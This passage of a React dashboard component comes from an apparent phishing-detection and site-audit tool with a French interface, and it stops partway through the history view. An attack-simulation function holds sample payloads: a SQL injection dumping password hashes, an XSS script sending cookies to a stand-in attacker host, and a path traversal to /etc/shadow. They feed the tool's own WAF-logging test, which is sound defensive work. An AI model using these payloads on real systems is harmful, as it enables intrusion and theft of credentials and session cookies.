import React, { useState, useEffect, useRef } from 'react';
import { useAuth } from '../context/AuthContext';
import { useLanguage } from '../context/LanguageContext';
import { 
  Send, History, Bot, CheckCircle2, 
  AlertTriangle, Sparkles, RefreshCw, X, Shield, Clock,
  Cpu, Activity, Zap, Search, FileText, Globe, MapPin,
  Lock, ArrowRight, ShieldCheck, ChevronRight, BarChart2, Eye, ChevronDown,
  Pin, Printer, FilePlus, Share2, Trash2, Copy, Check, ExternalLink, ShieldAlert,
  AlertOctagon, Layers, Award, Terminal, Server, Wifi, Link2, Radio, Info
} from 'lucide-react';
import MLMetricsPanel from '../components/MLMetricsPanel';

export default function StandardDashboard({ isHistoryView = false }) {
  const { user } = useAuth();
  const { lang, t } = useLanguage();
  
  // Tab switcher state
  const [activeMainTab, setActiveMainTab] = useState('SCANNER'); // 'SCANNER' or 'METRICS'

  // Real-time clock & date
  const [timeString, setTimeString] = useState('');
  const [dateString, setDateString] = useState('');

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      const locale = lang === 'fr' ? 'fr-FR' : 'en-US';
      setTimeString(now.toLocaleTimeString(locale, { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
      setDateString(now.toLocaleDateString(locale, { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' }));
    };
    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, [lang]);

  // Universal Scanner State
  const [investigationObjective, setInvestigationObjective] = useState('CONTENT'); // 'CONTENT' or 'SYSTEM'
  const [selectedModel, setSelectedModel] = useState('rf'); // 'rf', 'gbm', 'mlp'
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const dropdownRef = useRef(null);

  // Close dropdown menu when clicking outside on empty space
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
        setIsDropdownOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);
  const [targetContent, setTargetContent] = useState('');
  const [scanType, setScanType] = useState('URL'); // 'URL', 'SMS', 'EMAIL'
  const [isScanning, setIsScanning] = useState(false);
  const [currentResult, setCurrentResult] = useState(null);
  const [scanHistory, setScanHistory] = useState([]);
  
  // Incident Reporting State
  const [isReporting, setIsReporting] = useState(false);
  const [reportSuccess, setReportSuccess] = useState(null);
  
  // Floating AI Assistant State
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([
    { sender: 'assistant', text: `Bonjour ${user?.prenom || 'Alice'} ! Je suis votre assistant de sécurité CyberGuard AI. Collez un lien, un SMS ou un email pour lancer la détection.` }
  ]);
  const [chatInput, setChatInput] = useState('');
  const [isChatting, setIsChatting] = useState(false);

  // Pinned history items state (persisted in localStorage)
  const [pinnedIds, setPinnedIds] = useState(() => {
    try {
      return JSON.parse(localStorage.getItem('phishguard_pinned_ids')) || [];
    } catch(e) {
      return [];
    }
  });

  const togglePin = (itemId, e) => {
    if (e) e.stopPropagation();
    setPinnedIds(prev => {
      const updated = prev.includes(itemId) ? prev.filter(id => id !== itemId) : [...prev, itemId];
      localStorage.setItem('phishguard_pinned_ids', JSON.stringify(updated));
      return updated;
    });
  };

  // Custom Delete Confirmation Modal State
  const [itemToDelete, setItemToDelete] = useState(null);

  // Dedicated Report Modal State
  const [isReportModalOpen, setIsReportModalOpen] = useState(false);

  // Selected history item modal state
  const [selectedHistoryItem, setSelectedHistoryItem] = useState(null);

  // Copy Feedback States
  const [copiedUrl, setCopiedUrl] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);

  const copyToClipboard = (text, type = 'url') => {
    if (!text) return;
    try {
      navigator.clipboard.writeText(text);
      if (type === 'url') {
        setCopiedUrl(true);
        setTimeout(() => setCopiedUrl(false), 2000);
      } else {
        setCopiedHash(true);
        setTimeout(() => setCopiedHash(false), 2000);
      }
    } catch(e) {}
  };

  // Compute metrics strictly from database with instant local cache
  const [dbStats, setDbStats] = useState({
    total_analyses: 0,
    phishing_threats: 0,
    clean_analyses: 0,
    ml_accuracy: 98.4
  });

  const fetchDbMetrics = async () => {
    try {
      const token = localStorage.getItem('phishguard_token');
      const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
      const userKey = user?.id ? `_${user.id}` : '';
      
      const [resStats, resHist] = await Promise.all([
        fetch('/api/v1/analyze/stats', { headers }),
        fetch('/api/v1/analyze/history', { headers })
      ]);
      
      if (resStats.ok) {
        const statsData = await resStats.json();
        setDbStats(statsData);
        try { localStorage.setItem(`phishguard_cached_stats${userKey}`, JSON.stringify(statsData)); } catch(e){}
      }
      
      if (resHist.ok) {
        const histData = await resHist.json();
        const historyList = histData.history || [];
        setScanHistory(historyList);
        try { localStorage.setItem(`phishguard_cached_history${userKey}`, JSON.stringify(historyList)); } catch(e){}
        
        // Auto-display last test result on dashboard if available
        if (historyList.length > 0) {
          const latest = historyList[0];
          const formattedLatest = {
            id: latest.id,
            type: latest.type,
            target: latest.target,
            verdict: latest.verdict,
            riskScore: latest.riskScore,
            confidence: latest.confidence,
            details: latest.details || latest,
            timestamp: latest.timestamp
          };
          setCurrentResult(formattedLatest);
          try { localStorage.setItem(`phishguard_latest_result${userKey}`, JSON.stringify(formattedLatest)); } catch(e){}
        } else {
          setCurrentResult(null);
          try { localStorage.removeItem(`phishguard_latest_result${userKey}`); } catch(e){}
        }
      }
    } catch (e) {
      console.log('Error fetching DB metrics:', e);
    }
  };

  useEffect(() => {
    const userKey = user?.id ? `_${user.id}` : '';
    try {
      const savedHist = localStorage.getItem(`phishguard_cached_history${userKey}`);
      setScanHistory(savedHist ? JSON.parse(savedHist) : []);
      const savedRes = localStorage.getItem(`phishguard_latest_result${userKey}`);
      setCurrentResult(savedRes ? JSON.parse(savedRes) : null);
      const savedStats = localStorage.getItem(`phishguard_cached_stats${userKey}`);
      if (savedStats) setDbStats(JSON.parse(savedStats));
    } catch(e) {}
    
    fetchDbMetrics();
  }, [user?.id, isHistoryView]);

  const totalScans = dbStats.total_analyses;
  const phishingBlocked = dbStats.phishing_threats;
  const cleanScans = dbStats.clean_analyses;
  const mlAccuracy = dbStats.ml_accuracy || 98.4;

  // Detect whether content is URL or text
  const detectContentType = (text) => {
    const trimmed = text.trim();
    if (trimmed.startsWith('http://') || trimmed.startsWith('https://') || trimmed.includes('.com') || trimmed.includes('.fr') || trimmed.includes('.net') || trimmed.includes('.xyz')) {
      return 'URL';
    }
    return scanType === 'SMS' ? 'SMS' : 'EMAIL';
  };

  const handleScan = async (e, overrideObjective = null) => {
    if (e && typeof e.preventDefault === 'function') e.preventDefault();
    if (!targetContent.trim()) return;
    
    const activeObjective = overrideObjective || investigationObjective;
    setIsScanning(true);
    setCurrentResult(null);
    try {
      const actualType = detectContentType(targetContent);

      if (activeObjective === 'SYSTEM') {
        const res = await fetch('/api/v1/monitor/site-audit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ domain: targetContent })
        });

        if (!res.ok) {
          const errData = await res.json().catch(() => ({}));
          throw new Error(errData.detail || `Erreur serveur audit (${res.status})`);
        }

        const data = await res.json();
        const totalAttacks = data.total_attacks_logged || 0;
        const resObj = {
          id: Date.now(),
          type: 'AUDIT SITE',
          target: data.domain || targetContent,
          verdict: totalAttacks > 0 ? `MENACES SUR SITE (${totalAttacks} ATTAQUES)` : 'SITE CONFORME & SÉCURISÉ',
          riskScore: data.calculated_risk_score !== undefined ? data.calculated_risk_score : (totalAttacks > 0 ? Math.min(95, 30 + totalAttacks * 15) : 0),
          confidence: 0.98,
          details: {
            ...data,
            site_audit: true,
            features: {
              num_subdomains: 1,
              is_https: targetContent.startsWith('https'),
              has_ip: false,
              entropy: 3.5,
              keyword_count: 0
            },
            model_comparisons: [
              { name: "Moniteur WAF & Log Analyzer", accuracy: 99.1, phishing_prob: totalAttacks > 0 ? 85.0 : 0.0 },
              { name: "VirusTotal Threat Intelligence", accuracy: 98.4, phishing_prob: data.virustotal?.positives > 0 ? 90.0 : 0.0 },
              { name: "Google Safe Browsing", accuracy: 99.5, phishing_prob: data.google_safebrowsing?.is_flagged ? 95.0 : 0.0 }
            ],
            defensive_advice: totalAttacks > 0 ? [
              "Activez un Pare-feu Applicatif Web (WAF) pour bloquer les tentatives SQLi et XSS.",
              "Mettez en place un système d'alerte et de limitation de débit (Rate-Limiting) sur les API.",
              "Exécutez un audit de vulnérabilité régulier sur les répertoires serveurs."
            ] : [
              "Aucune attaque active enregistrée sur ce domaine. Maintenez les certificats SSL à jour.",
              "Pensez à surveiller les journaux d'accès web CyberGuard."
            ]
          },
          timestamp: new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
        };

        setCurrentResult(resObj);
        try { localStorage.setItem('phishguard_latest_result', JSON.stringify(resObj)); } catch(e){}
        setScanHistory(prev => [resObj, ...prev]);
        fetchDbMetrics();
        return;
      }

      let endpoint = (actualType === 'URL') ? 'analyze/url' : 'analyze/text';
      let payload = (actualType === 'URL') 
        ? { url: targetContent, model_choice: selectedModel } 
        : { text: targetContent, sender: '', analysis_type: actualType };

      const token = localStorage.getItem('phishguard_token');
      const headers = { 'Content-Type': 'application/json' };
      if (token) headers['Authorization'] = `Bearer ${token}`;

      const res = await fetch(`/api/v1/${endpoint}`, {
        method: 'POST',
        headers,
        body: JSON.stringify(payload)
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.detail || `Erreur serveur (${res.status})`);
      }

      const data = await res.json();
      
      const resObj = {
        id: data.id || data.analysis_id || Date.now(),
        type: actualType,
        target: targetContent,
        verdict: data.verdict || (data.risk_score >= 50 ? 'PHISHING' : 'LÉGITIME'),
        riskScore: data.risk_score !== undefined ? data.risk_score : 20,
        confidence: data.ml_confidence || 0.94,
        details: data,
        timestamp: new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
      };

      setCurrentResult(resObj);
      const userKey = user?.id ? `_${user.id}` : '';
      try { localStorage.setItem(`phishguard_latest_result${userKey}`, JSON.stringify(resObj)); } catch(e){}
      setScanHistory(prev => [resObj, ...prev]);
      fetchDbMetrics();
    } catch (err) {
      alert("Erreur lors de l'analyse : " + (err.message === 'Failed to fetch' ? "Le serveur backend CyberGuard (port 8000) est actuellement hors-ligne ou indisponible." : err.message));
    } finally {
      setIsScanning(false);
    }
  };

  // Live Attack Simulation for Testing WAF & Attacker Tracing
  const [isSimulatingAttack, setIsSimulatingAttack] = useState(false);

  const handleSimulateAttack = async (targetDomain) => {
    if (!targetDomain) return;
    setIsSimulatingAttack(true);
    try {
      const sampleAttacks = [
        {
          ip: "185.220.101.5",
          attack: "SQL_INJECTION",
          method: "POST",
          path: "/api/v1/auth/login",
          payload: "admin' UNION SELECT null, username, password_hash FROM users --"
        },
        {
          ip: "45.154.255.88",
          attack: "XSS",
          method: "GET",
          path: "/search?q=<script>fetch('http://attacker.xyz/steal?c='+document.cookie)</script>",
          payload: "<script>fetch('http://attacker.xyz/steal?c='+document.cookie)</script>"
        },
        {
          ip: "194.26.29.112",
          attack: "PATH_TRAVERSAL",
          method: "GET",
          path: "/download?file=../../../../etc/shadow",
          payload: "../../../../etc/shadow"
        }
      ];
      const selected = sampleAttacks[Math.floor(Math.random() * sampleAttacks.length)];

      await fetch('/api/v1/monitor/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          website_domain: targetDomain,
          source_ip: selected.ip,
          http_method: selected.method,
          request_path: selected.path,
          status_code: 403,
          payload: selected.payload
        })
      });

      // Automatically re-run site audit to display the new live incident!
      await handleScan(null, 'SYSTEM');
    } catch (err) {
      alert("Erreur lors de la simulation d'attaque : " + err.message);
    } finally {
      setIsSimulatingAttack(false);
    }
  };

  // Incident Report Form State
  const [reportCategory, setReportCategory] = useState("Campagne de Phishing / Usurpation");
  const [userNotes, setUserNotes] = useState("");

  const handleSendReport = async () => {
    if (!currentResult) return;
    setIsReporting(true);

    try {
      const token = localStorage.getItem('phishguard_token');
      const headers = { 'Content-Type': 'application/json' };
      if (token) headers['Authorization'] = `Bearer ${token}`;

      const res = await fetch('/api/v1/incidents/submit-user-report', {
        method: 'POST',
        headers,
        body: JSON.stringify({
          title: `[${reportCategory}] ${currentResult.target}`,
          target: currentResult.target,
          scan_type: currentResult.type,
          verdict: currentResult.verdict,
          risk_score: currentResult.riskScore,
          details: {
            ...(currentResult.details || {}),
            report_category: reportCategory,
            user_observations: userNotes || "Rapport généré par l'utilisateur pour étude approfondie par l'enquêteur SOC."
          },
          reporter_name: `${user?.prenom || 'Alice'} ${user?.nom || 'Martin'}`,
          reporter_email: user?.email || 'alice.martin@example.com'
        })
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.detail || "Erreur de transmission");

      setReportSuccess(`Rapport transmis avec succès à l'Enquêteur (${data.report?.report_code || 'REP-OK'}) • Hash SHA-256 scellé. L'enquêteur analyse votre dossier.`);
      setIsReportModalOpen(false);
    } catch (err) {
      alert("Erreur : " + err.message);
    } finally {
      setIsReporting(false);
    }
  };

  const handleSendMessage = async (e) => {
    e.preventDefault();
    if (!chatInput.trim()) return;

    const userText = chatInput;
    setChatInput('');
    setChatMessages(prev => [...prev, { sender: 'user', text: userText }]);
    setIsChatting(true);

    try {
      const token = localStorage.getItem('phishguard_token');
      const headers = { 'Content-Type': 'application/json' };
      if (token) headers['Authorization'] = `Bearer ${token}`;

      const res = await fetch('/api/v1/assistant/chat', {
        method: 'POST',
        headers,
        body: JSON.stringify({ message: userText, prompt: userText })
      });
      const data = await res.json();
      
      let botReply = data.reply || data.response || "Conseil de sécurité appliqué.";
      if (data.recommendations && data.recommendations.length > 0) {
        botReply += "\n\n**Recommandations de sécurité :**\n" + data.recommendations.map(r => `• ${r}`).join('\n');
      }

      setChatMessages(prev => [...prev, { sender: 'assistant', text: botReply }]);
    } catch (err) {
      setChatMessages(prev => [...prev, { sender: 'assistant', text: "L'assistant IA est indisponible." }]);
    } finally {
      setIsChatting(false);
    }
  };


  // Render deep technical inspection details (HTTP, SSL, Security Headers, DNS, Brand)
  const renderTechnicalDetails = (tech, blockNumber = 5) => {
    if (!tech) return null;
    const dns = tech.dns || {};
    const ssl = tech.ssl || {};
    const http = tech.http || {};
    const brand = tech.brand_impersonation || {};
    const secHeaders = http.security_headers || {};
    const aRecords = dns.a_records || [];
    const mxRecords = dns.mx_records || [];
    const isSslGood = ssl.ssl_active && ssl.is_trusted && !ssl.is_expired;

    return (
      <div className="space-y-3">
        {/* Brand Impersonation Alert if triggered */}
        {brand.is_impersonating && (
          <div className="p-4 rounded-2xl bg-rose-500/10 border-2 border-rose-500/40 text-rose-700 dark:text-rose-300 space-y-2 animate-in fade-in">
            <div className="flex items-center gap-2 font-mono font-black text-xs sm:text-sm text-rose-600 dark:text-rose-400">
              <AlertOctagon className="w-5 h-5 shrink-0 text-rose-500 animate-pulse" />
              <span>ALERTE CRITIQUE : TENTATIVE D'USURPATION DE LA MARQUE {brand.brand_name} DÉTECTÉE !</span>
            </div>
            <p className="text-xs leading-relaxed font-sans">{brand.explanation}</p>
            {brand.official_domains?.length > 0 && (
              <div className="text-[11px] font-mono pt-1 flex flex-wrap items-center gap-1.5">
                <span className="font-bold text-slate-700 dark:text-slate-300">Domaines officiels légitimes :</span>
                {brand.official_domains.map(d => (
                  <span key={d} className="px-2 py-0.5 bg-rose-500/20 text-rose-800 dark:text-rose-200 rounded font-bold">{d}</span>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Technical Deep Probe Card */}
        <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden bg-white dark:bg-[#111622]">
          <div className="flex flex-wrap items-center justify-between gap-2 px-4 py-3 bg-gradient-to-r from-blue-50 via-indigo-50 to-slate-50 dark:from-blue-950/20 dark:via-indigo-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 rounded-lg bg-sky-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">{blockNumber}</div>
              <Server className="w-4 h-4 text-sky-500" />
              <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">
                Détails Techniques & Sonde Réseau Réelle (HTTP, SSL, En-têtes, DNS)
              </span>
            </div>
            <div className="flex items-center gap-2">
              {http.security_grade && (
                <span className={`px-2.5 py-0.5 rounded-md text-[10px] font-mono font-black border ${
                  ['A+', 'A'].includes(http.security_grade) ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20' :
                  ['B', 'C'].includes(http.security_grade) ? 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/20' :
                  'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20'
                }`}>
                  Note En-têtes : {http.security_grade} ({http.security_score || 0}/100)
                </span>
              )}
              <span className="text-[10px] font-mono text-slate-400">
                {tech.inspected_at || 'Sonde Directe'}
              </span>
            </div>
          </div>

          <div className="p-4 space-y-4 text-xs font-mono">
            {/* 1. Live HTTP & Response Performance */}
            <div>
              <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400 mb-2">
                1. Connexion HTTP & Performance Réseau en Direct
              </p>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                <div className="p-3 bg-slate-50 dark:bg-[#161b27] rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[9px] text-slate-400 uppercase font-bold block">Réponse HTTP</span>
                  <div className="flex items-center gap-1.5 mt-1">
                    <span className={`w-2 h-2 rounded-full shrink-0 ${http.status_code === 200 ? 'bg-emerald-500' : http.status_code ? 'bg-amber-500' : 'bg-rose-500'}`} />
                    <span className="font-black text-slate-900 dark:text-white truncate">{http.status_text || 'Injoignable'}</span>
                  </div>
                </div>

                <div className="p-3 bg-slate-50 dark:bg-[#161b27] rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[9px] text-slate-400 uppercase font-bold block">Latence / RTT</span>
                  <div className="flex items-center gap-1.5 mt-1">
                    <Activity className="w-3.5 h-3.5 text-sky-500 shrink-0" />
                    <span className="font-black text-sky-600 dark:text-sky-400">{http.latency_ms || 0} ms</span>
                    <span className="text-[9px] text-slate-400 font-sans">({(http.latency_ms || 0) < 300 ? 'Rapide' : (http.latency_ms || 0) < 800 ? 'Moyen' : 'Lent'})</span>
                  </div>
                </div>

                <div className="p-3 bg-slate-50 dark:bg-[#161b27] rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[9px] text-slate-400 uppercase font-bold block">Serveur Détecté</span>
                  <span className="font-black text-slate-800 dark:text-slate-200 truncate block mt-1" title={http.server_banner}>
                    {http.server_banner || 'Non Divulgué'}
                  </span>
                </div>

                <div className="p-3 bg-slate-50 dark:bg-[#161b27] rounded-xl border border-slate-200 dark:border-slate-800">
                  <span className="text-[9px] text-slate-400 uppercase font-bold block">Chaîne Redirections</span>
                  <span className="font-black text-slate-800 dark:text-slate-200 block mt-1">
                    {http.redirect_count > 0 ? `${http.redirect_count} Saut(s)` : '0 (Lien direct)'}
                  </span>
                </div>
              </div>

              {(http.page_title || http.redirect_count > 0) && (
                <div className="mt-2 p-2.5 bg-slate-50 dark:bg-[#161b27] rounded-xl border border-slate-200 dark:border-slate-800 space-y-1 text-[11px]">
                  {http.page_title && (
                    <div className="flex items-center gap-2">
                      <span className="text-slate-400 font-bold uppercase text-[9px] shrink-0">Titre Page HTML :</span>
                      <span className="font-sans font-semibold text-slate-800 dark:text-slate-200 truncate">"{http.page_title}"</span>
                    </div>
                  )}
                  {http.redirect_count > 0 && (
                    <div className="flex items-center gap-2 truncate">
                      <span className="text-slate-400 font-bold uppercase text-[9px] shrink-0">Destination finale :</span>
                      <span className="text-indigo-600 dark:text-indigo-400 truncate">{http.final_url}</span>
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* 2. SSL / TLS Certificate Deep Dive */}
            <div>
              <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400 mb-2">
                2. Certificat de Sécurité SSL / Chiffrement TLS
              </p>
              <div className="p-3.5 rounded-xl border border-sky-100 dark:border-sky-800/40 bg-sky-50/20 dark:bg-sky-950/20 space-y-2.5">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-sky-200/40 dark:border-sky-800/40 pb-2">
                  <div className="flex items-center gap-2">
                    <Lock className={`w-4 h-4 ${isSslGood ? 'text-emerald-500' : 'text-rose-500'}`} />
                    <span className="font-bold text-slate-900 dark:text-white font-sans text-xs">Certificat d'Authenticité Numérique</span>
                  </div>
                  <span className={`px-2.5 py-0.5 rounded-md text-[10px] font-bold border ${
                    isSslGood ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20' :
                    ssl.is_expired ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' :
                    'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/20'
                  }`}>
                    {ssl.ssl_status}
                  </span>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-[11px]">
                  <div>
                    <span className="text-[9px] text-slate-400 block uppercase font-bold">Autorité Émettrice</span>
                    <strong className="text-slate-800 dark:text-slate-200 truncate block mt-0.5" title={ssl.issuer_org || ssl.issuer}>
                      {ssl.issuer_org || ssl.issuer || 'Inconnu'}
                    </strong>
                  </div>
                  <div>
                    <span className="text-[9px] text-slate-400 block uppercase font-bold">Nom Commun (CN)</span>
                    <strong className="text-slate-800 dark:text-slate-200 truncate block mt-0.5" title={ssl.subject_cn}>
                      {ssl.subject_cn || 'Inconnu'}
                    </strong>
                  </div>
                  <div>
                    <span className="text-[9px] text-slate-400 block uppercase font-bold">Échéance Expiration</span>
                    <strong className={`block mt-0.5 ${ssl.days_remaining !== null && ssl.days_remaining < 15 ? 'text-rose-500' : 'text-emerald-600 dark:text-emerald-400'}`}>
                      {ssl.days_remaining !== null ? `${ssl.days_remaining} jours restants` : (ssl.valid_to ? ssl.valid_to : 'Inconnu')}
                    </strong>
                  </div>
                  <div>
                    <span className="text-[9px] text-slate-400 block uppercase font-bold">Protocole Chiffré</span>
                    <strong className="text-slate-800 dark:text-slate-200 truncate block mt-0.5">
                      {ssl.tls_version ? `${ssl.tls_version}` : 'Non Détecté'}
                    </strong>
                  </div>
                </div>

                {ssl.subject_alt_names?.length > 0 && (
                  <div className="pt-1.5 flex flex-wrap items-center gap-1.5 text-[10px] border-t border-sky-200/30 dark:border-sky-800/30">
                    <span className="text-slate-400">Domaines SAN couverts :</span>
                    {ssl.subject_alt_names.slice(0, 4).map((san, idx) => (
                      <span key={idx} className="px-1.5 py-0.5 bg-white dark:bg-slate-800 rounded border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300 font-mono">{san}</span>
                    ))}
                    {ssl.subject_alt_names.length > 4 && <span className="text-slate-400">+{ssl.subject_alt_names.length - 4} autres</span>}
                  </div>
                )}
              </div>
            </div>

            {/* 3. HTTP Security Headers Matrix (OWASP) */}
            <div>
              <div className="flex items-center justify-between mb-2">
                <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400">
                  3. Audit des 6 En-têtes de Sécurité HTTP (Contrôles OWASP)
                </p>
                <span className="text-[10px] text-slate-400 font-mono">
                  {Object.values(secHeaders).filter(h => h.present).length} / 6 Conformes
                </span>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
                {[
                  { name: 'Strict-Transport-Security (HSTS)', data: secHeaders.hsts, desc: 'Empêche le déclassement SSL-Strip' },
                  { name: 'Content-Security-Policy (CSP)', data: secHeaders.csp, desc: 'Bloque les injections de code XSS' },
                  { name: 'X-Frame-Options', data: secHeaders.x_frame_options, desc: 'Protection anti-clickjacking' },
                  { name: 'X-Content-Type-Options', data: secHeaders.x_content_type_options, desc: 'Bloque le reniflage MIME' },
                  { name: 'Referrer-Policy', data: secHeaders.referrer_policy, desc: "Contrôle les fuites d'URL" },
                  { name: 'Permissions-Policy', data: secHeaders.permissions_policy, desc: 'Restreint les APIs sensibles du navigateur' },
                ].map((item, idx) => {
                  const isPass = item.data?.present;
                  return (
                    <div key={idx} className={`p-2.5 rounded-xl border flex items-start gap-2.5 ${
                      isPass ? 'bg-emerald-50/50 dark:bg-emerald-950/10 border-emerald-200/60 dark:border-emerald-900/30' : 'bg-rose-50/50 dark:bg-rose-950/10 border-rose-200/60 dark:border-rose-900/30'
                    }`}>
                      <div className={`w-4 h-4 rounded-full flex items-center justify-center shrink-0 mt-0.5 text-white text-[9px] font-black ${isPass ? 'bg-emerald-500' : 'bg-rose-500'}`}>
                        {isPass ? '✓' : '❌'}
                      </div>
                      <div className="min-w-0">
                        <p className="text-[11px] font-bold text-slate-800 dark:text-slate-100 truncate">{item.name}</p>
                        <p className="text-[9px] text-slate-400 font-sans leading-tight mt-0.5">{item.desc}</p>
                        <p className={`text-[10px] font-bold mt-1 ${isPass ? 'text-emerald-600 dark:text-emerald-400' : 'text-rose-600 dark:text-rose-400'}`}>
                          {item.data?.status || (isPass ? 'Actif' : 'Manquant')}
                        </p>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* 4. Live DNS Records & MX Mail Security */}
            <div>
              <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400 mb-2">
                4. Résolution DNS & Configuration Courrier Électronique (MX)
              </p>
              <div className="p-3 bg-slate-50 dark:bg-[#161b27] rounded-xl border border-slate-200 dark:border-slate-800 space-y-2">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-[11px]">
                  <div>
                    <span className="text-slate-400 text-[10px] block font-bold uppercase">Enregistrements A (IPv4) :</span>
                    <span className="font-bold text-slate-800 dark:text-slate-200 break-all">
                      {aRecords.length > 0 ? aRecords.join(', ') : 'Aucun enregistrement IPv4'}
                    </span>
                    {dns.aaaa_records?.length > 0 && (
                      <span className="text-[10px] text-slate-400 block truncate mt-1">IPv6 : {dns.aaaa_records[0]}</span>
                    )}
                  </div>

                  <div>
                    <span className="text-slate-400 text-[10px] block font-bold uppercase">Serveurs Mail MX (Messagerie) :</span>
                    {mxRecords.length > 0 ? (
                      <span className="font-bold text-emerald-600 dark:text-emerald-400 truncate block">
                        ✓ {mxRecords[0]} {mxRecords.length > 1 ? `(+${mxRecords.length - 1} serveurs)` : ''}
                      </span>
                    ) : (
                      <span className="font-bold text-amber-600 dark:text-amber-400 block">
                        ⚠️ Aucun serveur MX détecté (Courrier non configuré / Potentiel domaine jetable)
                      </span>
                    )}
                  </div>
                </div>
              </div>
            </div>

          </div>
        </div>
      </div>
    );
  };

  // Dedicated full history view renderer
  if (isHistoryView) {
    const filteredHistory = scanHistory.filter(item => {
      const query = historySearchQuery.toLowerCase().trim();
      const matchesText = !query || 
        (item.target && item.target.toLowerCase().includes(query)) ||
        (item.type && item.type.toLowerCase().includes(query)) ||
        (item.verdict && item.verdict.toLowerCase().includes(query)) ||
        (item.analysis_code && item.analysis_code.toLowerCase().includes(query)) ||
        (item.timestamp && item.timestamp.toLowerCase().includes(query));

      const matchesVerdict = 
        historyVerdictFilter === 'ALL' ? true :
        historyVerdictFilter === 'THREATS' ? (item.riskScore >= 50 || item.verdict === 'PHISHING') :
        (item.riskScore < 50 && item.verdict !== 'PHISHING');

      return matchesText && matchesVerdict;
    });

    const sortedScanHistory = [...filteredHistory].sort((a, b) => {
      const aPinned = pinnedIds.includes(a.id);
      const bPinned = pinnedIds.includes(b.id);
      if (aPinned && !bPinned) return -1;
      if (!aPinned && bPinned) return 1;
      return 0;
    });

    return (
      <div className="space-y-6 max-w-6xl mx-auto pb-20">
        <div className="bg-white/80 dark:bg-[#111622]/90 backdrop-blur-xl border border-sky-100 dark:border-sky-800/40 rounded-3xl p-8 shadow-2xl space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-sky-100 dark:border-sky-800/30 pb-4 gap-4">
            <div>
              <h2 className="text-2xl font-black text-slate-900 dark:text-white flex items-center gap-2.5 tracking-tight">
                <History className="w-7 h-7 text-sky-500" /> {lang === 'fr' ? 'Historique Général des Analyses' : 'General Analysis History'}
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
                {lang === 'fr' ? 'Registre sécurisé de toutes les analyses enregistrées dans la base de données CyberGuard.' : 'Secure ledger of all security scans recorded in the CyberGuard database.'}
              </p>
            </div>
            <span className="px-4 py-1.5 bg-sky-500/10 text-sky-600 dark:text-sky-300 text-xs font-mono font-extrabold rounded-full border border-sky-500/20 w-max">
              {filteredHistory.length} / {scanHistory.length} {lang === 'fr' ? 'éléments' : 'items'}
            </span>
          </div>

          {/* Interactive Search & Filter Bar */}
          <div className="flex flex-col sm:flex-row gap-3 items-center justify-between bg-sky-50/50 dark:bg-sky-950/20 p-3.5 rounded-2xl border border-sky-100 dark:border-sky-800/40">
            <div className="relative flex-1 w-full">
              <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder={lang === 'fr' ? "🔍 Rechercher dans l'historique par URL, canal, verdict, heure..." : "🔍 Search history by URL, channel, verdict, time..."}
                value={historySearchQuery}
                onChange={(e) => setHistorySearchQuery(e.target.value)}
                className="w-full pl-10 pr-4 py-2 bg-white dark:bg-[#111622] border border-sky-200 dark:border-sky-800/60 rounded-xl text-xs text-slate-900 dark:text-white placeholder-slate-400 focus:outline-none focus:border-sky-500 font-sans"
              />
            </div>
            <div className="flex items-center gap-1.5 shrink-0 text-xs font-sans font-bold w-full sm:w-auto">
              <button
                onClick={() => setHistoryVerdictFilter('ALL')}
